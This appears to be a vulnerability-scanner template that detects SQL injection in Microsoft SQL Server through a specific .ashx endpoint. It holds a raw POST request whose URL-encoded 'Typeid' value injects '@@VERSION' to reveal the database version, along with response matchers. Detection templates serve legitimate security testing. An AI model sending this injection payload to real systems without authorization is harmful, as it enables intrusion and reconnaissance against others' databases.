id: sql-injection-mssql-detection

info:
  name: SQL Injection MSSQL Detection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects potential SQL injection vulnerabilities targeting Microsoft SQL Server. The response is analyzed for evidence of the database server in the response body.
  tags: sql-injection, mssql, injection

http:
  - raw:
      - |
        POST /Ajax/GetDropDowListContent.ashx HTTP/1.1
        User-Agent: Mozilla/4.0 (compatible: MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip,deflate
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 58
        Host: {{Hostname}}

        action=getType&Typeid=%2d%31%2f%40%40%56%45%52%53%49%4f%4e

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "MicrosoftSQL Server"

    extractors:
      - type: regex
        part: body
        regex:
          - "Microsoft Corporation"